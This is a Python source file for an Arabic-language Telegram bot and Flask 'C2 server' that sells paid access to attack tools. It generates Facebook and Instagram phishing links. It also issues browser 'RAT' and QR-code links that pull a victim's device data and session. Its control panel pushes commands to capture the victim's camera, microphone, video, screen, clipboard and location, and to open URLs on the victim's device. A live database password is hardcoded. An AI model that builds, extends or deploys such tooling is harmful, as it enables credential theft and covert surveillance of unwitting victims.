# main.py
import os
import io
import threading
import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
import redis
import uuid

# ============================================================
# استيراد ملفات الأدوات
# ============================================================
try:
    from facebook_module import init_facebook_routes
except Exception as e:
    print(f"[-] Error importing facebook_module: {e}")
    init_facebook_routes = lambda app, bot: None

try:
    from instagram_module import init_instagram_routes
except Exception as e:
    print(f"[-] Error importing instagram_module: {e}")
    init_instagram_routes = lambda app, bot: None

try:
    from rat_module import init_rat_routes, rat_bp, queue_command
except Exception as e:
    print(f"[-] Error importing rat_module: {e}")
    init_rat_routes = lambda app, bot: None
    rat_bp = None
    queue_command = lambda *args: None

try:
    from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
except Exception as e:
    print(f"[-] Error importing qr_pairing: {e}")
    init_qr_routes = lambda app, bot: None
    qr_bp = None
    generate_qr_code_bytes = lambda *args: None

# ============================================================
# استيراد LSH Module
# ============================================================
try:
    from lsh_module import (
        init_lsh_routes,
        lsh_bp,
        generate_qr_code_bytes as lsh_generate_qr,
        set_bot_reference,
        push_command as lsh_push_command,
        get_session as lsh_get_session,
        build_lsh_control_panel,
    )
    LSH_ENABLED = True
except Exception as e:
    print(f"[-] Error importing lsh_module: {e}")
    LSH_ENABLED = False

    def init_lsh_routes(app, bot): pass
    def set_bot_reference(bot): pass
    def lsh_push_command(*a, **kw): return False
    def lsh_get_session(*a, **kw): return None
    def lsh_generate_qr(*a, **kw): return io.BytesIO()
    def build_lsh_control_panel(*a, **kw): return InlineKeyboardMarkup()
    lsh_bp = None

# ============================================================
# استيراد نظام الدفع
# ============================================================
try:
    from stars_payment import (
        register_payment_handlers,
        get_or_create_user,
        can_use_tool,
        consume_usage,
        build_plans_keyboard,
        build_main_payment_keyboard,
        build_account_text,
        build_plans_text,
        send_invoice,
        PRICING_PLANS,
        FREE_TRIAL_USES,
        AVAILABLE_TOOLS,
    )
    PAYMENT_ENABLED = True
except Exception as e:
    print(f"[-] Error importing stars_payment: {e}")
    PAYMENT_ENABLED = False

    def register_payment_handlers(bot): pass
    def get_or_create_user(*a, **kw): return {}
    def can_use_tool(*a, **kw): return {"allowed": True, "reason": "bypass"}
    def consume_usage(*a, **kw): return True
    def build_plans_keyboard(): return InlineKeyboardMarkup()
    def build_main_payment_keyboard(): return InlineKeyboardMarkup()
    def build_account_text(*a, **kw): return "نظام الدفع معطّل"
    def build_plans_text(): return "نظام الدفع معطّل"
    def send_invoice(*a, **kw): pass
    PRICING_PLANS = {}
    FREE_TRIAL_USES = 1
    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh"]


# ============================================================
# إعدادات عامة
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
    redis_client.ping()
    print("[+] main: Redis connected")
except Exception as e:
    print(f"[-] Critical Redis Connection Error: {e}")
    redis_client = None

if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN is missing!")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)


# ============================================================
# Health check
# ============================================================
@app.route('/')
def health_check():
    return "C2 Server and Telegram Bot are active and running smoothly.", 200


# ============================================================
# تسجيل Blueprints ومسارات
# ============================================================
if rat_bp:
    app.register_blueprint(rat_bp)
if qr_bp:
    app.register_blueprint(qr_bp)
if LSH_ENABLED and lsh_bp:
    app.register_blueprint(lsh_bp)

init_facebook_routes(app, bot)
init_instagram_routes(app, bot)
init_rat_routes(app, bot)
init_qr_routes(app, bot)
init_lsh_routes(app, bot)

if LSH_ENABLED:
    set_bot_reference(bot)

# تسجيل معالجات الدفع
register_payment_handlers(bot)


# ============================================================
# القوائم
# ============================================================
def main_menu():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
    markup.add(InlineKeyboardButton("🕹️ السيطرة الكاملة على الجلسة (LSH)", callback_data="gen_lsh"))
    markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    return markup


def payment_menu():
    return build_main_payment_keyboard()


# ============================================================
# رسائل مساعدة
# ============================================================
def _deny_message(reason, user_id, tool, data=None):
    data = data or {}
    if reason == "daily_limit_reached":
        return (
            "⚠️ **وصلت للحد اليومي لباقتك الحالية.**\n\n"
            f"🎯 الحد اليومي: {data.get('daily_limit', 0)} عملية\n"
            "💎 قم بترقية باقتك أو انتظر لليوم التالي."
        )
    if reason == "no_credit":
        return (
            "❌ **لا يوجد لديك استخدام متاح لهذه الأداة.**\n\n"
            f"🎁 حصلت على {FREE_TRIAL_USES} استخدام مجاني فقط عند التسجيل.\n"
            "💎 اشترك في إحدى الباقات للاستمرار.\n\n"
            "اضغط على 💎 الاشتراكات والدفع لعرض الباقات."
        )
    return "❌ لا يمكن استخدام الأداة حالياً."


# ============================================================
# Start Command
# ============================================================
@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    user_name = message.from_user.first_name
    get_or_create_user(
        message.from_user.id,
        message.from_user.username or "Unknown",
        user_name
    )
    text = (
        f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
        "غير مسؤول تماماً عن إساءة الاستخدام.\n\n"
        f"🎁 لديك {FREE_TRIAL_USES} استخدام مجاني لكل أداة."
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())


# ============================================================
# Callback Handler
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id

    # ============================================================
    # قسم الدفع
    # ============================================================
    if call.data == "payment_menu":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "💎 **قسم الاشتراكات والدفع**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "اختر ما تريد:",
            parse_mode="Markdown",
            reply_markup=build_main_payment_keyboard()
        )
        return

    if call.data == "show_plans":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            build_plans_text(),
            parse_mode="Markdown",
            reply_markup=build_plans_keyboard()
        )
        return

    if call.data.startswith("buy_plan_"):
        plan_key = call.data.replace("buy_plan_", "")
        bot.answer_callback_query(call.id, "جاري تجهيز الفاتورة...")
        send_invoice(bot, chat_id, plan_key)
        return

    if call.data == "my_account":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_account_text(chat_id), parse_mode="Markdown")
        return

    if call.data == "back_to_main":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "القائمة الرئيسية:", reply_markup=main_menu())
        return

    # ============================================================
    # توليد فيسبوك
    # ============================================================
    if call.data == "gen_fb":
        check = can_use_tool(chat_id, "fb")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "fb", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "fb")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
        link = f"{RAILWAY_URL}/login.php?id={chat_id}"
        bot.send_message(chat_id, f"🎯 رابط فيسبوك المخصص:\n `{link}` ", parse_mode="Markdown")
        return

    # ============================================================
    # توليد انستقرام
    # ============================================================
    if call.data == "gen_ig":
        check = can_use_tool(chat_id, "ig")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "ig", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "ig")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
        link = f"{RAILWAY_URL}/ig_login.php?id={chat_id}"
        bot.send_message(chat_id, f"📸 رابط انستقرام المخصص:\n `{link}` ", parse_mode="Markdown")
        return

    # ============================================================
    # توليد RAT
    # ============================================================
    if call.data == "gen_rat":
        check = can_use_tool(chat_id, "rat")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "rat", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "rat")
        bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي...")
        link = f"{RAILWAY_URL}/system_secure_v2?id={chat_id}"
        bot.send_message(
            chat_id,
            f"📱 رابط المراقبة والتحكم الخلفي المطور جاهز:\n `{link}` \n\n"
            "بمجرد أن يفتح الضحية الرابط ستعمل الجلسة في خلفية متصفحه بلا توقف.",
            parse_mode="Markdown"
        )
        return

    # ============================================================
    # توليد QR
    # ============================================================
    if call.data == "gen_qr":
        check = can_use_tool(chat_id, "qr")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "qr", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "qr")
        bot.answer_callback_query(call.id, "جاري توليد كود الـ QR السريع...")
        token = str(uuid.uuid4())[:8]
        if redis_client:
            try:
                redis_client.setex(f"qr_token:{token}", 300, chat_id)
            except Exception as e:
                print(f"Redis write error: {e}")

        target_link = f"{RAILWAY_URL}/qr_scan_target?token={token}"
        qr_image = generate_qr_code_bytes(target_link)
        if qr_image:
            qr_image.name = 'pairing_qr.jpg'
            bot.send_photo(
                chat_id,
                qr_image,
                caption="📷 **امسح هذا الـ QR بكاميرا هاتف الضحية:**\n\n"
                        "بمجرد توجيه الكاميرا وفتح الرابط، سيتم سحب بيانات الجهاز "
                        "وجلسة الضحية فوراً إلى بوتك هنا دون تثبيت أي برامج!",
                parse_mode="Markdown"
            )
        else:
            bot.send_message(chat_id, f"🎯 **رابط الـ QR المباشر:**\n`{target_link}`", parse_mode="Markdown")
        return

    # ============================================================
    # توليد LSH
    # ============================================================
    if call.data == "gen_lsh":
        check = can_use_tool(chat_id, "lsh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "lsh", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "lsh")
        bot.answer_callback_query(call.id, "جاري تجهيز جلسة التحكم الكامل...")

        # إنشاء الجلسة محلياً مباشرة (بدون HTTP)
        session_id = str(uuid.uuid4()).replace('-', '')[:24]
        if redis_client:
            try:
                redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
            except Exception as e:
                print(f"[-] Redis setex LSH error: {e}")

        # محاولة إنشاء جلسة في الذاكرة أيضاً عبر HTTP (اختياري)
        try:
            requests.post(
                f"{RAILWAY_URL}/lsh_create",
                json={"chat_id": chat_id, "session_id": session_id},
                timeout=5
            )
        except Exception as e:
            print(f"[-] LSH create HTTP warning: {e}")

        target_link = f"{RAILWAY_URL}/lsh?s={session_id}&id={chat_id}"
        qr_image = lsh_generate_qr(target_link)

        if qr_image:
            qr_image.name = 'lsh_qr.png'
            try:
                bot.send_photo(
                    chat_id, qr_image,
                    caption=(
                        "🕹️ **جلسة السيطرة الكاملة جاهزة!**\n"
                        "━━━━━━━━━━━━━━━━━━\n\n"
                        "🎯 **وجّه الضحية لمسح الكود أو افتح الرابط:**\n"
                        f"`{target_link}`\n\n"
                        "📊 **ما سيتم تلقائياً:**\n"
                        "• تقرير كامل عن الجهاز + IP الحقيقي\n"
                        "• صورة من الكاميرا الأمامية\n"
                        "• تسجيل صوتي من الميكروفون\n"
                        "• لوحة تحكم حية بأزرار تفاعلية\n\n"
                        "⚠️ الجلسة تنتهي بعد 24 ساعة."
                    ),
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"[-] send_photo error: {e}")
                bot.send_message(
                    chat_id,
                    f"🕹️ **رابط الجلسة:**\n`{target_link}`",
                    parse_mode="Markdown"
                )
        else:
            bot.send_message(
                chat_id,
                f"🕹️ **رابط الجلسة:**\n`{target_link}`",
                parse_mode="Markdown"
            )
        return

    # ============================================================
    # أوامر RAT (لا تستهلك رصيداً)
    # ============================================================
    if call.data.startswith("rat_cam_"):
        target_chat_id = call.data.replace("rat_cam_", "")
        queue_command(target_chat_id, "snapshot")
        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")
        return

    if call.data.startswith("rat_mic_"):
        target_chat_id = call.data.replace("rat_mic_", "")
        queue_command(target_chat_id, "audio")
        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
        return

    # ============================================================
    # أوامر LSH — الأسماء الجديدة المطابقة لـ lsh_module.py
    # ============================================================
    if call.data.startswith("lsh_snap_"):
        sid = call.data.replace("lsh_snap_", "")
        ok = lsh_push_command(sid, {"action": "snapshot"})
        bot.answer_callback_query(call.id, "📸 جاري طلب الصورة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_audio_"):
        sid = call.data.replace("lsh_audio_", "")
        ok = lsh_push_command(sid, {"action": "audio", "payload": {"duration": 6000}})
        bot.answer_callback_query(call.id, "🎙️ جاري التسجيل..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_video_"):
        sid = call.data.replace("lsh_video_", "")
        ok = lsh_push_command(sid, {"action": "video", "payload": {"duration": 10000}})
        bot.answer_callback_query(call.id, "🎥 جاري تسجيل الفيديو..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_screen_"):
        sid = call.data.replace("lsh_screen_", "")
        ok = lsh_push_command(sid, {"action": "screen"})
        bot.answer_callback_query(call.id, "🖥️ جاري التقاط الشاشة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_clip_"):
        sid = call.data.replace("lsh_clip_", "")
        ok = lsh_push_command(sid, {"action": "clipboard"})
        bot.answer_callback_query(call.id, "📋 جاري سحب الحافظة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_loc_"):
        sid = call.data.replace("lsh_loc_", "")
        ok = lsh_push_command(sid, {"action": "location"})
        bot.answer_callback_query(call.id, "📍 جاري تحديث الموقع..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_open_"):
        sid = call.data.replace("lsh_open_", "")
        bot.answer_callback_query(call.id, "🌐 أرسل الرابط الآن")
        _pending_open_url[chat_id] = sid
        bot.send_message(
            chat_id,
            "🌐 **أرسل الرابط الذي تريد فتحه على جهاز الضحية**\n"
            "(يجب أن يبدأ بـ http:// أو https://)"
        )
        return

    if call.data.startswith("lsh_vibrate_"):
        sid = call.data.replace("lsh_vibrate_", "")
        ok = lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500, 200, 500]}})
        bot.answer_callback_query(call.id, "📳 تم الإرسال" if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return

    if call.data.startswith("lsh_kill_"):
        sid = call.data.replace("lsh_kill_", "")
        ok = lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
        bot.answer_callback_query(call.id, "❌ جاري الإنهاء..." if ok else "❌ فشل الإرسال", show_alert=not ok)
        if not ok:
            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
        return


# ============================================================
# معالجة الرابط المُدخل لفتحه على الضحية
# ============================================================
_pending_open_url = {}


@bot.message_handler(func=lambda m: m.chat.id in _pending_open_url and m.text and m.text.startswith("http"))
def handle_open_url(message):
    sid = _pending_open_url.pop(message.chat.id, None)
    if sid:
        ok = lsh_push_command(sid, {"action": "url", "payload": {"url": message.text}})
        if ok:
            bot.send_message(message.chat.id, "✅ سيتم فتح الرابط على جهاز الضحية خلال ثانيتين")
        else:
            bot.send_message(message.chat.id, "❌ **فشل الإرسال** — تحقق من اتصال Redis")


# ============================================================
# تشغيل البوت
# ============================================================
def run_telegram_bot():
    print("[+] Starting Telegram Bot polling in background thread...")
    try:
        bot.delete_webhook(drop_pending_updates=True)
        print("[+] Old webhook deleted, polling mode active")
    except Exception as e:
        print(f"[-] delete_webhook warning: {e}")

    try:
        bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=30)
    except Exception as e:
        print(f"[-] Telegram Polling Error: {e}")


if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    port = int(os.environ.get("PORT", 8080))
    print(f"[+] Flask Web Server starting on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
